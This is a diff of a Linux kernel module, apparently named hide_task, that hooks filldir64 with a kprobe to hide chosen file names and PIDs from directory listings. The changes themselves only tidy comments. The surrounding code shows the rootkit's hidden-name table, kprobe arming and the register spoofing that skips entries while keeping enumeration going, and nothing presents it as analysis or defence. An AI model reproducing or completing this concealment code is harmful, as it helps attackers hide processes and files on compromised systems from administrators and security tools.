@@ -15,10 +15,7 @@
 #include <linux/uaccess.h>
 #include <linux/version.h>
 
-/* filldir64 return contract flipped from int (5.10..6.0) to bool (6.1+).
- * "Continue enumeration but skip this entry" is 0 (int) or true=1 (bool);
- * false=0 in the new ABI means "stop the whole readdir", which would
- * truncate the caller's listing. Bug #4. */
+/* filldir64 return contract flipped int (5.10..6.0) -> bool (6.1+); the "skip-but-continue" value follows suit (was 0, now true=1). */
 #if LINUX_VERSION_CODE >= KERNEL_VERSION(6, 1, 0)
 #define HT_FILLDIR_CONTINUE 1UL
 #else
@@ -33,7 +30,7 @@
 
 #define HT_NAME_BUF 12
 
-/* Forward decl — definition further down; both name_add and pid_add funnel through this lazy-arm gate. */
+/* Forward decl; both name_add and pid_add funnel through this lazy-arm gate. */
 static int hide_task_register_kprobe_locked(void);
 
 /* B.1 file-name hiding: exact basename match, up to HIDE_NAME_MAX-1 chars per slot. */
@@ -41,7 +38,7 @@ static int hide_task_register_kprobe_locked(void);
 #define HIDE_NAME_SLOTS 16u
 struct hidden_name_entry {
 	u8 in_use;
-	u8 len;                /* strlen; 0 when in_use is clear */
+	u8 len; /* strlen; 0 when in_use is clear */
 	char name[HIDE_NAME_MAX];
 };
 static struct hidden_name_entry hidden_names[HIDE_NAME_SLOTS];
@@ -208,8 +205,7 @@ static int filldir64_pre(struct kprobe *p, struct pt_regs *regs) {
 	return 0;
 
 spoof:
-	/* Skip original filldir; return the correct "continue but skip entry"
-	 * value for this kernel's filldir_t contract (see HT_FILLDIR_CONTINUE). */
+	/* Skip original filldir; return "continue but skip entry" per filldir_t contract. */
 	regs->regs[0] = HT_FILLDIR_CONTINUE;
 	instruction_pointer_set(regs, procedure_link_pointer(regs));
 	return 1;
